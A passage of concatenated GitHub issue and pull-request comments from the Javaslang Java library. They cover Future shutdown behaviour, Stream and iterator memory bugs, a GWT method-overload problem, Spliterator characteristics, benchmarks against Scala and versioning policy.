.foreach(println)\n\nprintln(\"Shutdown...\")\nexecutorService.shutdown()\nexecutorService.awaitTermination(3, java.util.concurrent.TimeUnit.SECONDS)\n\n}\ndef foo(i: Int) = i.toString\n}\n```\nThis is the output when line #1 is commented out:\nbash\nRunning...\nShutdown...\njava.util.concurrent.RejectedExecutionException: Task scala.concurrent.impl.CallbackRunnable@24135fa8 rejected from java.util.concurrent.ThreadPoolExecutor@34c42156[Shutting down, pool size = 1, active threads = 1, queued tasks = 0, completed tasks = 0]\n    at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2047)\n    at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:823)\n    at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1369)\n    at scala.concurrent.impl.ExecutionContextImpl$$anon$1.execute(ExecutionContextImpl.scala:159)\n    at scala.concurrent.impl.CallbackRunnable.executeWithValue(Promise.scala:68)\n    at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1(Promise.scala:284)\n    at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1$adapted(Promise.scala:284)\n    at scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:284)\n    at scala.concurrent.Promise.complete(Promise.scala:49)\n    at scala.concurrent.Promise.complete$(Promise.scala:48)\n    at scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183)\n    at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29)\n    at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60)\n    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\n    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\n    at java.lang.Thread.run(Thread.java:745)\nThis is the output when line #1 is executed:\nbash\nRunning...\nShutdown...\nBigF is ok\n. Summary:\nWithout line #1 (waiting some millis for bigF to complete) the following happens:\n\nThe Future bigF is created\nbigF is mapped to \"BigF is ok\". bigF isn't completed yet. Internally a Promise is created. The Promise has an underlying Future which will run as soon as bigF is completed.\nThe ExecutorService is shutdown. Especially it accepts no new Futures.\nEventually bigF completes. The crucial part: The promise cannot run the mapper \"BigF is ok\" because the ExecutorService does not accept new tasks.\n\nThe only way to first execute all tasks and then shutdown is to initiate shutdown when the Future is completed (Javaslang example):\njava\nstatic void waitAndShutdown(ExecutorService executorService, Future<?>... futures) {\n    Future.sequence(executorService, List.of(futures))\n          .onComplete(ignored -> Try.run(() -> {\n              executorService.shutdown();\n              executorService.awaitTermination(3, TimeUnit.SECONDS);\n          }));\n}\n. I will close the issue because Scala's Future and Javaslang's Future behave the same.. This is a valid question. The Stream class is designed to represent infinite sequences. If the example throws, it is a bug.\nI ran the example in Scala. It successfully finished with the expected result:\nbash\nscala> Stream.continually(1).drop(100000000).head\nres0: Int = 1\n\nI expect we have a memory leak. More specifically I think that a lambda captures the outer scope, namely this Stream. As a result, dropping elements does not release memory. The head elements are still wired to the tail.\nWe need to further investigate it.... @densmnko On the current master (2.1.0-SNAPSHOT) it works fine on my machine. Even faster than Scala! Which version of Javaslang do you use?\n| Number of Elements | Time (Javaslang) | Time (Scala) |\n| ---: | ---: | ---: |\n| 100_000_000 | 4 sec | 5 sec to 15 sec |\n| 1_000_000_000 | 37 sec | 50 sec to 158 sec |\nI don't know why different Scala runs vary that much. Javaslang runs are time-stable.\nPlease note that I did not adjust the memory configuration of Java. It was IntelliJ's resp. Scala REPL's default value.\nPlease also note, that I used ints instead of longs:\njava\n// Javaslang\nStream.continually(1).drop(1_000_000_000).head();\nscala\n// Scala\nStream.continually(1).drop(1000000000).head\n\nMy system config:\nMacBook Pro\n2,9 GHz Intel Core i7\n16 GB 2133 MHz LPDDR3\nJava(TM) SE Runtime Environment (build 1.8.0_121-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.121-b13, mixed mode)\nScala code runner version 2.12.1. @densmnko Jeppe Cramon gave me a hint that your low heap might has been caused the OOM exception (I first thought the heap was 8g to give more space to compute).\nI re-ran your original the Javaslang example (with 100_000_000 elements) on my machine using 2.1.0-SNAPSHOT and the VM option -Xmx8m. Again, all worked fine (the GC had clearly more to do):\nFor 100_000_000 elements it now took from 5 sec. to 20 sec.. @densmnko Thanks, good to know! It was fun to test it anyway \ud83d\ude0a. Hi, thank you for your suggestion. Currently (2.0.5) there is an ugly workaround:\njava\nfuture.await();    // blocks until completed and returns the future instance\nfuture.getValue() // returns Option<Try<T>>\n      .get()      // returns a Try<T> because we know that the Option is a Some\n      .get();     // returns a Value of type T or throws a NonFatalException that wraps the original exception\nWith Javaslang 2.1.0 await() will return the Future instance.\nValue sits at the top of the Javaslang type hierarchy. Currently it defines an abstract get() that throws NoSuchElementException in the empty case. However, Try extends Value and Try.get() throws a NonFatalException (which can be considered as a bug, it should throw a NoSuchElementException).\nHowever, in 3.0.0 there will be some changes. I think we should allow get() to throw an arbitrary (non-fatal?) exception in the empty case. Additionally we will get rid of the NonFatalException wrapper by sneaky throwing arbitrary exceptions at runtime.\nThen your wish could be expressed like this:\njava\n// a future Javaslang 3.0.0\nfuture.get();\nUntil that you could use this helper:\n```java\nimport javaslang.concurrent.Future;\nimport javaslang.control.Try;\npublic class Test {\npublic static void main(String[] args) {\n\n    Future<String> future1 = Future.successful(\"ok\");\n    System.out.println(block(future1));\n\n    Future<String> future2 = Future.failed(new Exception(\"error\"));\n    System.out.println(block(future2));\n\n}\n\nstatic <T> T block(Future<T> future) {\n    future.await();\n    final Try<T> result = future.getValue().get();\n    if (result.isEmpty()) {\n        sneakyThrow(result.getCause());\n    }\n    return result.get();\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T extends Throwable> void sneakyThrow(Throwable t) throws T {\n    throw (T) t;\n}\n\n}\n```\nAdding an additional block() method is currently no option for us because we want to keep the API as thin and simple as possible, await().get() will do the job. But it will take some time until 3.0.0 will be released... Too much to do, too few time.\n. Fixed with #1976 . @DouglasBrunner Did you take a look at https://github.com/javaslang/javaslang-jackson ?. @DouglasBrunner many thanks!. Hi Ruslan, yes you are right, it is redundant. We can't assume that elements of type V are (naturally) comparable. A Comparator<Tuple2<K, V>> would effectively compare only the key elements (keys are unique, so this is sufficient).\nI think we should leave it this way, deprecate keyComparator() and remove it in 3.0.0.. I will move all incoming feature-requests to 3.0.0 now - otherwise we will never see 2.1.0.. Fixed with #2017 by @ruslansennov . The Patterns code generator needs to honour the \\@Deprecated annotation.. Thank you, I've overseen that. Maybe we can provide a GWT compatible version, s.th. like\njava\ntoJavaList().toArray(new Character[size()]);. All collections will have that issue. We aligned the naming to standard Java.\nExample:\n\njava.util.stream.Stream.of(T... values)\njava.util.stream.Stream.of(T value)\n\nWe reworked already the factory method API because of ambiguities, see #721.\nFor special cases, like array of arrays, an explicit cast or type hint behind the '.' has to be provided.\nMaybe it is an Eclipse Compiler bug. Java's Stream has the same problem.\n. @ruslansennov could you please add the following gwt/javascript tests to javaslang-gwt project:\nFactory method tests:\n\nassertThat(Set.of(1).contains(1)).isTrue()\nassertThat(Set.of(1, 2).contains(2)).isTrue()\n\nAPI alias tests:\n\nassertThat(Set(1).contains(1)).isTrue()\nassertThat(Set(1, 2).contains(2)).isTrue()\n\nThese should ensure that the generated javascript code calls the right methods.. @ruslansennov isn't this a general problem for javascript? How to choose the right method in an untyped language:\n```java\nfunction of(element) { ... }\nfunction of(elementArray) { ... }\n```\nIn Javascript these are the same. I guess the GWT Java to Javascript compiler will disambiguate the names by adding param type information to the function names.... @ruslansennov thank you, that sounds good!\nof will then be ofAll. It should be sufficient if it takes an Iterable (does not matter much here):\njava\nC tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<Iterable<T>, C> ofAll)\nI would stay with the array:\njava\nfinal T[] elements = (T[]) new Object[n];\nand finally wrap the array as List:\njava\nreturn ofAll.apply(Arrays.asList(elements));\n. @nfekete To report a GWT bug we need a minimal example. S.th. like this:\n```java\nimport java.util.function.Function;\npublic class Test {\npublic static void main(String[] args) {\n    final String result = test(Test::of);\n    if (\"one\".equals(result)) {\n        throw new Error(\"'many' expected but found 'one'\");\n    }\n}\n\nstatic <T> String of(T t) {\n    return \"one\";\n}\n\nstatic <T> String of(T[] ts) {\n    return \"many\";\n}\n\nstatic <T> String test(Function<T[], String> of) {\n    @SuppressWarnings(\"unchecked\")\n    final T[] ts = (T[]) new Object[] { null };\n    return of.apply(ts);\n}\n\n}\n```\n@ruslansennov could you run that code please in a GWT test/example (on the client side)?\n@ruslansennov I updated the example. Interesting. Then we should strip down the Javaslang library to the classes and methods that are called (but keep the implementations as far as possible).\nThere are still differences, for example the Collections class is package private and so on.\nI will create a stripped down example tomorrow, need some sleep.. @ruslansennov it should not affect our 2.1.0 release. It will be fixed in GWT 2.8.1. If GWT 2.8.1 isn't out before Javaslang 2.1.0, we are able to release javaslang-gwt-2.1.1 without changing javaslang-2.1.0.\nI would close this ticket.. Great to hear!. No code changed. Added only deprecation annotations and changed javadoc. Will merge now.... @ruslansennov yes - that's right. Sleep well, and thank you for all the improvements!!. @ruslansennov I will merge to see if the triggered build runs ok. (it should). Cool, thx!. Great finding, thank you. Will take a look this evening.. I've shortened the Javaslang example a bit and can reproduce the error.\n```java\nimport static javaslang.API.*;\nimport javaslang.collection.Iterator;\nclass InfiniteGroupedIterators {\nstatic class Message {\n    final double count;\n    Message(double count) { this.count = count; }\n}\n\ndouble count = 0;\n\nIterator<Message> getInfiniteIterator() {\n    return Iterator.continually(() -> new Message(++count));\n}\n\n{\n    getInfiniteIterator()\n            .grouped(100)\n            .zipWithIndex()\n            .forEach(t -> println(String.format(\"Processed %s group\", String.valueOf(t._2))));\n}\n\n}\n```\nWhen starting the test with -Xmx64m I receive the following output:\njava\nException in thread \"main\" java.lang.OutOfMemoryError: GC overhead limit exceeded\n    at javaslang.collection.Stream.cons(Stream.java:232)\n    at javaslang.collection.StreamModule$StreamFactory.create(Stream.java:2036)\n    at javaslang.collection.StreamModule$StreamFactory.lambda$create$0(Stream.java:2036)\n    at javaslang.collection.StreamModule$StreamFactory$$Lambda$2/189568618.get(Unknown Source)\n    at javaslang.Lazy.computeValue(Lazy.java:148)\n    at javaslang.Lazy.get(Lazy.java:143)\n    at javaslang.collection.StreamModule$ConsImpl.tail(Stream.java:1842)\n    at javaslang.collection.Stream.drop(Stream.java:928)\n    at javaslang.collection.Stream.splitAt(Stream.java:1407)\n    at javaslang.collection.Iterator$41.hasNext(Iterator.java:1844)\n    at javaslang.collection.Iterator$28.hasNext(Iterator.java:1148)\n    at javaslang.Value.forEach(Value.java:316)\n    at javaslang.InfiniteGroupedIterators.<init>(InfiniteGroupedIterators.java:35)\n    at javaslang.InfiniteGroupedIterators.main(InfiniteGroupedIterators.java:14)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.lang.reflect.Method.invoke(Method.java:498)\n    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147)\nI will dig deeper ~~tomorrow~~ the day after tomorrow.... @lbialy Thank you for reporting the bug! We where able to fix it and speeded it up.. There will be a 2.0.6 the next days.. I had in mind to create a generalized Tailrec type, very similar to this.\nUsage:\njava\npublic Future<Integer> factorial(int i) {\n    return Tailrec.apply(() -> {\n            if (i == 0) {\n                return Future.value(1);\n            } else {\n                return factorial(i - 1).map(j -> i * j);\n            }\n    });\n}\n(copied from the javadocs (and fixed code), see link above)\nA stackless recursion on the JVM (using Java) is possible by using the heap instead. In general there is already a bytecode modification (since Java 7?) that would allow to implement real stackless recursion in Java.. It is copy-pasted from the javadoc. However, it is a java class. Please follow the link (I already provided above):\nhttps://github.com/traneio/future/blob/dc041e66be0bfa431039b969487732d6ac9b1d39/future-java/src/main/java/io/trane/future/Tailrec.java . ~~Really!? Maybe Project Lombok is used??~~\nI've double-checked it. Of course it is Java. Don't look at the javadoc, look at the code! Also the maven pom.xml says that it is Java.. Don't have the time currently to explain it. Mario Fusco wrote about it (I think there are at least slides on slideshare), \"Functional Programming in Java\" may have a section about it and cyclops-react project also had s.th. similar.... Instead of introducing a new (public) type Trampoline we should consider to add a method\njava\nfunction*.trampoline()\nSee how Groovy does it. Also related: https://de.slideshare.net/mariofusco/lazine (page 33 ff). Technically it is possible, but it is artificial to do so. Looks like new, intermediate object instances are created on each recursion step in order to move the stack activity to the heap. That's no option for is.. Fusing similar code and speeding up things + making them more memory efficient is alway a good idea.\nI will create a feature branch that we can work on. The experimental HashMap could use the best of both worlds, BMT and HAMT. I.e. using the hashing stuff of HAMT and building a structure using BMT.\nBut caution: open-addressed impls may perform very very bad: http://stackoverflow.com/a/2557451/1110815\n\nOpen-addressing is usually faster than chained hashing when the load factor is low because you don't have to follow pointers between list nodes. It gets very, very slow if the load factor approaches 1, because you end up usually having to search through many of the slots in the bucket array before you find either the key that you were looking for or an empty slot. Also, you can never have more elements in the hash table than there are entries in the bucket array.\n. Yes, but if HAMT is moderately slower (absolutely) for the good case and more stable in direction to the worst case I would prefer HAMT. We have to check that. Scala uses HAMT for HashMap. This might have a reason.. @paplorinc I've created the open-addressing-hash-map branch.. > we could store two arrays in a specialized BMT somehow...\n\nI would not change the BMT for the purpose of an Open Addressing (OA) HashMap. The past development showed that it is best to create specialized backing structures for each purpose.\nOn the other hand we do not want to have another backing collection, we want to reduce them. Changing BMT in order to make it work for Vector and HashMap will make it too complicated (-> separation of concerns). In the end no one would know which line of code is necessary for which other collection...\n\nwe could use BitSet to store info about the values\n\nMaybe this will make it too heavy-weight. We should try to stay on the lowest level possible for our backing collections: primitive types, bit-operations, ...\n\nwe may want to use better hashing than a simple modulo\n\nYes, definitely. The quality of the hashing algorithm is the key to an outstanding hashed collection.\n\nI will try to get more involved after solving the issues I'm currently on - too many parallel tasks \ud83d\ude33. Closed because this issue is stale.\nIf this is an issue, we need a new investigation, which map impl is state of the art to that moment.. Nothing earth-shattering, will merge. @paplorinc I think this is the best we can do for now. Please approve or reject the code review.\nIn 3.0.0 we will remove AbstractIterator. Iterator will not have a toString() overload any more, which should be ok. However, it is only interesting for the empty case.... Thank you, Lorinc :). Starting with vavr-0.9.0 we will hide Lambda and Memoized.\nHowever, thread-safety and cache invalidation are still an important topic ~~that need to be covered in this issue.~~. (Checked)Function{1..8}.Memoized is now public. Hi\n\nDo you want me to add them explicitly?\n\nyes, please. Only for the mentioned method references. The paramName::methodName method references throw before passed as new parameter to an existing function.\nThe executorService does not need to be checked again.\n\nExample:\n```java\nimport java.util.Objects;\nimport java.util.function.Supplier;\npublic class Test {\npublic static void main(String[] args) {\n    testSupplier(null);\n}\n\nstatic <T> void testSupplier(Supplier<T> s) {\n    testCheckedSupplier(s::get); // <------ throws immediately if s is null\n}\n\nstatic <T> void testCheckedSupplier(Supplier<T> s) {\n    Objects.requireNonNull(s, \"s is null\");\n    System.out.println(\"ok\");\n}\n\n}\n```\nOutput:\njava\nException in thread \"main\" java.lang.NullPointerException\n    at javaslang.Test.testSupplier(Test.java:18)\n    at javaslang.Test.main(Test.java:14)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.lang.reflect.Method.invoke(Method.java:498)\n    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147)\n. Thank you!. Fixes #1811 . (hello, travis-ci, why weren't you triggered?). travis-ci is not triggered: https://twitter.com/traviscistatus/status/840236186497048577. I made a Strawman's benchmark: I started an example on the shell and looked on my stopwatch. After 30 seconds I aborted the program.\nResults first...\njava\nScala 2.12.1:\n  Processed 4400000 groups 42 mb\n--\nJavaslang\n  Using AbstractIterator\n    // buffer.appendAll(that.take(step)).drop(step)\n    Vector buffer: Processed 3400000 groups 63 mb\n    Array  buffer: Processed 3400000 groups 63 mb\n    // buffer.drop(step).appendAll(that.drop(gap).take(step))\n    Vector buffer: Processed 3500000 groups 63 mb\n    Array  buffer: Processed 3500000 groups 63 mb\n  Using Iterator\n    // buffer.drop(step).appendAll(that.drop(gap).take(step))\n    Vector buffer: Processed 3900000 groups 63 mb\n    // that.drop(gap).take(step).toList().prependAll(buffer.drop(step))\n    List   buffer: Processed 4290000 groups 63 mb\n    List   buffer: Processed 4400000 groups 63 mb <---- +drop-optimization #1910\nSee #1910\nUpdate: I switched from Vector to List buffer and gained 10%. List is fast and memory-efficient for small collections. See also this Twitter conversation:\n\nInterpretation\nI started scala resp. java with -Xmx64m on the same shell. The example is an infinite Iterator that calls grouped().\nThe interesting thing is that we face heavy garbage collection (GC), an effect that we do not see during our JMH benchmarks. After a second the free mem is nearly zero and the GC has to permanently collect garbage, otherwise the Iterator could not process next elements.\nWe observe that Scala does not go beyond 42 mb, although we gave 64 mb. Seems to be a Scala-internal thing. Java takes 63 mb.\n~~The Scala execution is 1.12 x faster than the Javaslang version.~~ After applying some optimizations (using List instead of Vector buffer, Iterator interface instead of Abstract Iterator and a List.drop() shortcut) we are observing same performance as in Scala.\nIn fact that does not really say something about the CPU performance of the Iterator. Scala uses a mutable ArrayBuffer to store elements, we use an immutable Vector (or Array). Immutable collections might produce more object instances because existing elements cannot be mutated. So the performance-gap between Scala and Javaslang might also have to do with object instantiation, garbage collection, memory fragmentation and so on.\nJMH benchmarks will give us more insight...\nCode\n```scala\n// Scala\nobject InfiniteGroupedIterators {\ndef main(args: Array[String]): Unit = {\n  }\ncase class Message(count: Double)\nvar index = 0d\ndef infiniteIterator = Iterator.continually(() => {\n    index = index + 1\n    Message(index)\n  })\ninfiniteIterator\n    .grouped(100)\n    .zipWithIndex\n    .foreach { t => println(s\"Processed ${t._2} groups ${Runtime.getRuntime.totalMemory / 1048576} mb\") }\n}\n```\n```java\n// Java\nimport static javaslang.API.*;\nimport javaslang.collection.Iterator;\nclass InfiniteGroupedIterators {\npublic static void main(String[] args) {\n    new InfiniteGroupedIterators();\n}\n\nstatic class Message {\n    final double count;\n    Message(double count) { this.count = count; }\n}\n\ndouble index = 0;\n\nIterator<Message> getInfiniteIterator() {\n    return Iterator.continually(() -> new Message(++index));\n}\n\n{\n    getInfiniteIterator()\n            .grouped(100)\n            .zipWithIndex()\n            .forEach(t -> println(String.format(\"Processed %s groups %s mb\", String.valueOf(t._2), Runtime.getRuntime().totalMemory() / 1048576)));\n}\n\n}\n```. @paplorinc I added a simple sliding benchmark for slang/scala:\n```java\nBenchmark                                   (CONTAINER_SIZE)   Mode  Cnt         Score         Error  Units\nIteratorBenchmark.Sliding.scala_persistent                10  thrpt    7  25055342.232 \u00b1 1204029.823  ops/s\nIteratorBenchmark.Sliding.scala_persistent               100  thrpt    7  24922099.560 \u00b1 1634678.049  ops/s\nIteratorBenchmark.Sliding.scala_persistent              1000  thrpt    7  23741708.468 \u00b1  463918.240  ops/s\nIteratorBenchmark.Sliding.slang_persistent                10  thrpt    7  15487347.449 \u00b1  649896.302  ops/s\nIteratorBenchmark.Sliding.slang_persistent               100  thrpt    7  15051798.533 \u00b1  632192.673  ops/s\nIteratorBenchmark.Sliding.slang_persistent              1000  thrpt    7  12654430.670 \u00b1 1081082.228  ops/s\nDetailed Performance Execution Report\n(Error: \u00b199% confidence interval, expressed as % of Score)\n  (Outliers removed: 30.00% low end, 5.00% high end)\n  (scala_persistent, slang_persistent: read as current row implementation is x times faster than alternative implementation)\nTarget             Operation   Impl                  Params  Count            Score  \u00b1     Error    Unit  scala_persistent  slang_persistent\nIteratorBenchmark  Sliding     scala_persistent          10      5    25,220,372.98  \u00b1     8.49%   ops/s                              1.63\u00d7\nIteratorBenchmark  Sliding     scala_persistent         100      5    25,036,302.95  \u00b1    13.08%   ops/s                              1.65\u00d7\nIteratorBenchmark  Sliding     scala_persistent        1000      5    23,748,305.54  \u00b1     3.36%   ops/s                              1.87\u00d7\nIteratorBenchmark  Sliding     slang_persistent          10      5    15,500,127.68  \u00b1     6.78%   ops/s            0.61\u00d7                \nIteratorBenchmark  Sliding     slang_persistent         100      5    15,161,905.19  \u00b1     6.46%   ops/s            0.61\u00d7                \nIteratorBenchmark  Sliding     slang_persistent        1000      5    12,718,506.29  \u00b1    16.98%   ops/s            0.54\u00d7                  \nPerformance Ratios\n(Outliers removed: 30.00% low end, 5.00% high end)\nRatios  / slang\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     1.63\u00d7    1.65\u00d7    1.87\u00d7\nRatios slang / \nTarget             Operation  Ratio                                    10      100     1000 \nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     0.61\u00d7    0.61\u00d7    0.54\u00d7\n```\n. After basing the Iterators (slang/scala) on the element array we have the following results. (Note: Scala used a WrappedArray instance for that purpose).\n```java\nBenchmark                                   (CONTAINER_SIZE)   Mode  Cnt         Score         Error  Units\nIteratorBenchmark.Sliding.scala_persistent                10  thrpt    7  21799919.856 \u00b1 1541033.917  ops/s\nIteratorBenchmark.Sliding.scala_persistent               100  thrpt    7  24810257.144 \u00b1  876216.887  ops/s\nIteratorBenchmark.Sliding.scala_persistent              1000  thrpt    7  23622057.664 \u00b1  950035.353  ops/s\nIteratorBenchmark.Sliding.slang_persistent                10  thrpt    7  15451903.983 \u00b1 1101329.863  ops/s\nIteratorBenchmark.Sliding.slang_persistent               100  thrpt    7  15032204.539 \u00b1  333253.341  ops/s\nIteratorBenchmark.Sliding.slang_persistent              1000  thrpt    7  13460040.034 \u00b1  415575.322  ops/s\nDetailed Performance Execution Report\n(Error: \u00b199% confidence interval, expressed as % of Score)\n  (Outliers removed: 30.00% low end, 5.00% high end)\n  (scala_persistent, slang_persistent: read as current row implementation is x times faster than alternative implementation)\nTarget             Operation   Impl                  Params  Count            Score  \u00b1     Error    Unit  scala_persistent  slang_persistent\nIteratorBenchmark  Sliding     scala_persistent          10      5    21,925,497.91  \u00b1    13.54%   ops/s                              1.43\u00d7\nIteratorBenchmark  Sliding     scala_persistent         100      5    24,958,627.13  \u00b1     5.53%   ops/s                              1.66\u00d7\nIteratorBenchmark  Sliding     scala_persistent        1000      5    23,770,536.48  \u00b1     4.66%   ops/s                              1.78\u00d7\nIteratorBenchmark  Sliding     slang_persistent          10      5    15,316,589.82  \u00b1    13.15%   ops/s            0.70\u00d7                \nIteratorBenchmark  Sliding     slang_persistent         100      5    14,994,119.35  \u00b1     4.12%   ops/s            0.60\u00d7                \nIteratorBenchmark  Sliding     slang_persistent        1000      5    13,373,117.20  \u00b1     2.40%   ops/s            0.56\u00d7                  \nPerformance Ratios\n(Outliers removed: 30.00% low end, 5.00% high end)\nRatios  / slang\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     1.43\u00d7    1.66\u00d7    1.78\u00d7\nRatios slang / \nTarget             Operation  Ratio                                    10      100     1000 \nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     0.70\u00d7    0.60\u00d7    0.56\u00d7\n```\n. @paplorinc Do you think there is something todo or can it be approved/merged?. @paplorinc thank you, I will further investigate it before merging it.. @paplorinc It was it worth to wait with the merge of this PR. I found one bug (a specific sliding execution that was not covered by tests) and could speed up the GroupedIterator:\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     0.10\u00d7    0.12\u00d7    0.61\u00d7\nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     9.84\u00d7    8.65\u00d7    1.65\u00d7\n. Here is an overview over the other scenarios:\nObject[] buffer\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     0.10\u00d7    0.12\u00d7    0.61\u00d7\nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     9.84\u00d7    8.65\u00d7    1.65\u00d7\nList buffer\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     1.43\u00d7    1.66\u00d7    1.78\u00d7\nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     0.70\u00d7    0.60\u00d7    0.56\u00d7\nVector buffer\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     3.79\u00d7    3.70\u00d7    4.05\u00d7\nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     0.26\u00d7    0.27\u00d7    0.25\u00d7\nArray buffer\nTarget             Operation                              Ratio        10      100     1000 \nIteratorBenchmark  Sliding    scala_persistent/slang_persistent     3.98\u00d7    3.53\u00d7    4.84\u00d7\nIteratorBenchmark  Sliding    slang_persistent/scala_persistent     0.25\u00d7    0.28\u00d7    0.21\u00d7\n. Thank you :). I restarted the initial Strawman's benchmark and got this result (30 seconds run):\n```java\n// scala\nProcessed 4400000 groups 42 mb\n// javaslang\nProcessed 5478179 groups 63 mb\n```. Thank you!. @NataliiaPrivezentseva Hi! I don't know exactly. Maybe we only have to take a look at all implementations. I think then we can close this issue.. Will close this now. We will check benchmarks before 1.0 final.. I've checked it - the build failed because Value creates a Spliterator with characteristics:\nIMMUTABLE | DISTINCT | SIZED | SUBSIZED\nAnd Lazy is tested to have characteristic ORDERED.\nI will double-check which characteristics Java 9's Optional has. We can take all of these for our single-valued Value implementations. Please wait a minute.... Java 9's Optional has:\n```\njshell> Optional.of(1).stream().spliterator().characteristics()\n$4 ==> 17488\n0100010001010000\n16    ORDERED\n64    SIZED\n1024  IMMUTABLE\n16384 SUBSIZED\n```\n@v1ctor We should do the same and remove DISTINCT from Value. It might be reserved for containers with multiple elements.. Mmhh, ORDERED is the same league as DISTINCT - I see no logical reason to have the one but not the other. But we should do it as in Optional.\nI will check if the latest Java 9 builds behave the same. Also I will ask one of the JDK committers.... I installed the latest JDK 9-ea build 160 and checked it again. Same characteristics. Alright, our Values need to return ORDERED, IMMUTABLE, SIZED, SUBSIZED. Thank you! We are lucky that the Lazy test failed :). Build says failed but I can't see the logs. Maybe a Travis-CI error.... @v1ctor \n\nBut I don't really understand if these characteristics make any difference for the single-valued types?\n\nI also do not understand it. We can merge it as is (can't be that wrong if Java 9 does it the same). But I will try to clarify it by asking someone of the Java committers.. Hah, there it is :)\njava\nshouldHaveDistinctSpliterator(javaslang.LazyTest)  Time elapsed: 0.047 sec  <<< FAILURE!\norg.junit.ComparisonFailure: expected:<[tru]e> but was:<[fals]e>\n    at javaslang.LazyTest.shouldHaveDistinctSpliterator(LazyTest.java:304). @v1ctor I think that was the final commit. Many thanks for your long breath! I will merge it in after the build finished.. @v1ctor \n\nP.S. I will take something else ;-) If you have something in your mind, it would be great!\n\nGreat! I think the next logical step for you is to take #1555 (#1635 was a side-story of it).\nPlease start reading a bit through the log of the issue. There we talk about two methods: equals and eq. We focus on equals and eq is out of scope in a first step (we might check later if there is s.th. to do).\nWe can discuss then how to further process (tomorrow or the next days, no hurry!).\nSummary\nThis changes the behavior of collection's equals method. Traversable should override equals and add a javadoc that contains a description for all existing collection types (Seq, Set, Map, Multimap, Tree, ...).\nCollection Equality\n\nThe collection libraries have a uniform approach to equality and hashing. The idea is, first, to divide collections into sets, maps, and sequences. Collections in different categories are always unequal. For instance, Set(1, 2, 3) is unequal to List(1, 2, 3) even though they contain the same elements. On the other hand, within the same category, collections are equal if and only if they have the same elements (for sequences: the same elements in the same order). For example, List(1, 2, 3) == Vector(1, 2, 3), and HashSet(1, 2) == TreeSet(2, 1).\n\nSource: Scala Documentation. Hi,\n\nI believe that javaslang is stating that it interprets Semantic Versioning's backward compatibility to mean binary compatibility (drop in jar replacement)\n\nOur versioning scheme is <major>.<minor>.<bugfix>.\nBugfix releases are drop-in replacements. Often semantics change when a bug is fixed (e.g. unexpected exception was thrown).\nMinor releases are targeted to be binary compatible and are therefore also drop-in replacements. We might change bounds of generics, which sometimes causes source backward compatibility problems. However, if the source is under control, this is no problem.\nMajor releases are meant to evolve Javaslang. This includes breaking backward compatibility by making API changes. Please don't expect a major release to be backward compatible.. > Somehow I messed this up and made #1913\nWill take a look :). I've edited the comment. You may copy it to your PR - your sentence needs to be changed.. Hi @skestle, I created a new PR #1918 and will close this. Thank you!. Moving the version number to the name is like suffixing a C++ variable name with its type.\nI think there is no need to do that in order to guarantee compatibility. E.g. in Maven or Gradle the version is already part of the coordinates of an artifact.\nHaving the version as part of the name is uncommon. The repackaging process is specific to your company. We provide a way that is simple and works for everyone.\nAnyway - it is just a name. It is not a formal proof that the library is really backward compatible.. I understand. Hard decision.\nTo me, evolving the library is as important as keeping it stable. I think eternal backward compatibility does not exist. Even Java is not fully backward compatible. For example semantics change: some libs falsely relied on HashMap element order and the algorithm changed in Java 7. It does not matter that it is an illegal usage of an API. It runs in production systems and it works - as long as s.th. changes. Another example is that Java 9 will abandon internal API that was public. Also Java 9 will abandon lambda parameter name reflection, which was ~~non-internal, public API~~ not intended to be used but not explicitly hidden. Noone can guarantee 100% backward compatibility.\nCo-existing versions of same transitive dependencies is a big problem every non-trivial Java application faces today. The Java Platform Module System (JPMS) will not solve it.\nThe key to a stable application are tests - the more the better.\n. Maybe we have a win-win situation here. I've taken a look at RxJava and how they dealt with the backward compatibility in their major version jump:\n```java\nRxJava 1:\n  group-id:    io.reactivex\n  artifact-id: rxjava\n  version:     1.x.y\n  package:     rx.*\nRxJava 2:\n  group-id:    io.reactivex.rxjava2\n  artifact-id: rxjava\n  version:     2.x.y\n  package:     io.reactivex.*\n```\nJavaslang 1 and 2 have a different group-id because we changed our domain name:\n```java\nJavaslang 1\n  group-id:    com.javaslang\n  